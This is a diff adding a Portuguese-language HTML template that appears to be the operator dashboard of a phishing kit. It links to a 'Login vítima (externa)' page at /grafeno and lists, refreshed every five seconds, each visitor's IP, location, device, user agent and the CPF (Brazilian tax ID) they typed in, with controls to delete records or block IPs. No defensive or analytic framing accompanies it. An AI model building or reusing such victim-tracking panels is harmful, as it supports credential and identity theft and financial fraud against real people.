@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="csrf-token" content="XEqQgGHeIQcSn1OBSL8G6RbUJTUNWkNC3hHIC8qM" />
+  <title><%= title %></title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; margin: 0; padding: 16px; background: #0f0f12; color: #e2e2e2; }
+    h1 { font-size: 1.4rem; margin: 0 0 16px; color: #00bba7; }
+    .toolbar { margin-bottom: 16px; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+    .toolbar a { color: #00bba7; text-decoration: none; }
+    .toolbar a:hover { text-decoration: underline; }
+    .toolbar .ativo { color: #e2e2e2; font-weight: 600; }
+    .toolbar code { background: #27272a; padding: 2px 6px; border-radius: 4px; font-size: 12px; color: #00bba7; }
+    table { width: 100%; border-collapse: collapse; background: #18181b; border-radius: 8px; overflow: hidden; font-size: 13px; }
+    th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #27272a; }
+    th { background: #27272a; color: #a1a1aa; font-weight: 600; font-size: 11px; text-transform: uppercase; }
+    tr:hover { background: #1f1f23; }
+    tr.blocked { opacity: 0.6; }
+    .btns { display: flex; flex-wrap: wrap; gap: 6px; }
+    .btns button { padding: 6px 10px; border: none; border-radius: 6px; cursor: pointer; font-size: 12px; background: #3f3f46; color: #e2e2e2; }
+    .btns button:hover { background: #00bba7; color: #0f0f12; }
+    .btns button.danger:hover { background: #dc2626; color: #fff; }
+    .btns button.warn:hover { background: #b45309; color: #fff; }
+    .btns button:disabled { opacity: 0.6; cursor: not-allowed; }
+    #btn-limpar-todos { padding: 6px 12px; border: none; border-radius: 6px; cursor: pointer; background: #713f12; color: #fcd34d; font-size: 12px; }
+    #btn-limpar-todos:hover { background: #b45309; color: #fff; }
+    #btn-limpar-todos:disabled { opacity: 0.6; cursor: not-allowed; }
+    .empty { text-align: center; padding: 40px; color: #71717a; }
+    .atualizado { font-size: 11px; color: #71717a; }
+    .ua-cell { max-width: 280px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .ua-cell[title] { cursor: help; }
+    .nav-operador { background: #18181b; border-bottom: 1px solid #27272a; padding: 12px 16px; margin: -16px -16px 16px -16px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    .nav-operador .nav-tabs { display: flex; gap: 4px; }
+    .nav-operador .nav-tabs a { padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 14px; color: #a1a1aa; background: transparent; }
+    .nav-operador .nav-tabs a:hover { background: #27272a; color: #00bba7; }
+    .nav-operador .nav-tabs a.ativo { background: #00bba7; color: #0f0f12; pointer-events: none; }
+    .nav-operador .nav-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
+    .nav-operador .nav-right a { color: #00bba7; text-decoration: none; font-size: 13px; }
+    .nav-operador .nav-right a.sair { color: #f87171; }
+  </style>
+</head>
+<body>
+  <nav class="nav-operador">
+    <div class="nav-tabs">
+      <a href="/operador">Infos</a>
+      <a href="/operador/acessos" class="ativo">Acessos</a>
+    </div>
+    <div class="nav-right">
+      <a href="/grafeno">Login vítima (externa)</a>
+      <a href="/operador/logout" class="sair">Sair</a>
+    </div>
+  </nav>
+  <h1>Painel Operador – Acessos</h1>
+  <div class="toolbar">
+    <span id="contador">0 acessos</span>
+    <span class="atualizado">Atualiza a cada 5s</span>
+    <button type="button" id="btn-limpar-todos" class="warn">Limpar todos</button>
+  </div>
+  <p class="atualizado" style="margin:0 0 12px 0;">Cada visita à página é registrada ao carregar. Quando o usuário digita o CPF (vira info), o acesso fica vinculado. Opções: Excluir (remove o registro) ou Bloquear (bloqueia o IP e remove a sessão em Infos se houver CPF vinculado).</p>
+
+  <table id="tabela">
+    <thead>
+      <tr>
+        <th>ITEM</th>
+        <th>IP</th>
+        <th>Hash</th>
+        <th>Data</th>
+        <th>País</th>
+        <th>Estado</th>
+        <th>Cidade</th>
+        <th>CPF/Info</th>
+        <th>User Agent</th>
+        <th>Device</th>
+        <th>OPÇÕES</th>
+      </tr>
+    </thead>
+    <tbody id="corpo">
+    </tbody>
+  </table>
+  <div id="vazio" class="empty" style="display:none;">Nenhum acesso registrado. Os acessos aparecem quando alguém carrega a página /grafeno.</div>
+
+  <script>
+    function getToken() {
+      return document.querySelector('meta[name="csrf-token"]') && document.querySelector('meta[name="csrf-token"]').getAttribute('content') || '';
+    }
+
+    function escapeHtml(str) {
+      if (str == null) return '';
+      var s = String(str);
+      return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+    }
+
+    function formatarData(ts) {
+      if (!ts) return '-';
+      var d = new Date(ts);
+      var pad = function (n) { return (n < 10 ? '0' : '') + n; };
+      return pad(d.getDate()) + '/' + pad(d.getMonth() + 1) + '/' + d.getFullYear() + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
+    }
+
+    function formatarCPF(login) {
+      if (!login) return '-';
+      var s = String(login).replace(/\D/g, '');
+      if (s.length !== 11) return escapeHtml(login) || '-';
+      return s.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+
+    function excluirAcesso(id, btn) {
+      if (!confirm('Excluir este acesso da lista?')) return;
+      var $btn = $(btn);
+      $btn.prop('disabled', true).text('...');
+      $.ajax({
+        url: '/api/acessos/' + id,
+        method: 'DELETE',
+        headers: { 'X-CSRF-TOKEN': getToken() }
+      }).done(function () {
+        carregar();
+      }).fail(function () {
+        $btn.prop('disabled', false).text('Excluir');
+        alert('Erro ao excluir.');
+      });
+    }
+
+    function limparTodos() {
+      if (!confirm('Limpar TODOS os acessos? A lista ficará vazia. Isso não pode ser desfeito.')) return;
+      $('#btn-limpar-todos').prop('disabled', true).text('Limpando...');
+      $.ajax({
+        url: '/api/acessos',
+        method: 'DELETE',
+        headers: { 'X-CSRF-TOKEN': getToken() }
+      }).done(function () {
+        $('#btn-limpar-todos').text('Limpar todos').prop('disabled', false);
+        carregar();
+      }).fail(function () {
+        $('#btn-limpar-todos').text('Limpar todos').prop('disabled', false);
+        alert('Erro ao limpar.');
+      });
+    }
+
+    function bloquearAcesso(id, btn) {
+      if (!confirm('Bloquear o IP deste acesso? Novas visitas desse IP não serão registradas.')) return;
+      var $btn = $(btn);
+      $btn.prop('disabled', true).text('...');
+      $.ajax({
+        url: '/api/acessos/' + id + '/bloquear',
+        method: 'POST',
+        contentType: 'application/json',
+        headers: { 'X-CSRF-TOKEN': getToken() },
+        data: JSON.stringify({})
+      }).done(function () {
+        carregar();
+      }).fail(function () {
+        $btn.prop('disabled', false).text('Bloquear');
+        alert('Erro ao bloquear.');
+      });
+    }
+
+    function carregar() {
+      $.getJSON('/api/acessos').done(function (data) {
+        var acessos = data.acessos || [];
+        $('#contador').text(acessos.length + ' acesso(s)');
+        var tbody = $('#corpo');
+        tbody.empty();
+        if (acessos.length === 0) {
+          $('#vazio').show();
+          return;
+        }
+        $('#vazio').hide();
+        acessos.forEach(function (a, idx) {
+          var trClass = a.blocked ? 'blocked' : '';
+          var opts = '<div class="btns">';
+          opts += '<button type="button" onclick="excluirAcesso(' + a.id + ', this)">Excluir</button>';
+          if (!a.blocked) opts += '<button type="button" class="warn" onclick="bloquearAcesso(' + a.id + ', this)">Bloquear</button>';
+          else opts += '<span style="color:#71717a;font-size:11px;">Bloqueado</span>';
+          opts += '</div>';
+          var ua = (a.user_agent || '').trim();
+          var uaEsc = escapeHtml(ua);
+          var uaCell = ua ? ('<span class="ua-cell" title="' + uaEsc + '">' + uaEsc + '</span>') : '-';
+          var cpfInfo = a.login ? formatarCPF(a.login) : '-';
+          var tr = '<tr class="' + trClass + '" data-id="' + a.id + '">' +
+            '<td>' + (idx + 1) + '</td>' +
+            '<td>' + escapeHtml(a.ip || '-') + '</td>' +
+            '<td>' + escapeHtml(a.hash || '-') + '</td>' +
+            '<td>' + formatarData(a.data) + '</td>' +
+            '<td>' + escapeHtml(a.pais || '-') + '</td>' +
+            '<td>' + escapeHtml(a.estado || '-') + '</td>' +
+            '<td>' + escapeHtml(a.cidade || '-') + '</td>' +
+            '<td>' + cpfInfo + '</td>' +
+            '<td>' + uaCell + '</td>' +
+            '<td>' + escapeHtml(a.device || '-') + '</td>' +
+            '<td>' + opts + '</td></tr>';
+          tbody.append(tr);
+        });
+      }).fail(function () {
+        $('#corpo').empty();
+        $('#vazio').show().text('Erro ao carregar acessos.');
+      });
+    }
+
+    $(function () {
+      carregar();
+      setInterval(carregar, 5000);
+      $('#btn-limpar-todos').on('click', limparTodos);
+    });
+  </script>
+</body>
+</html>
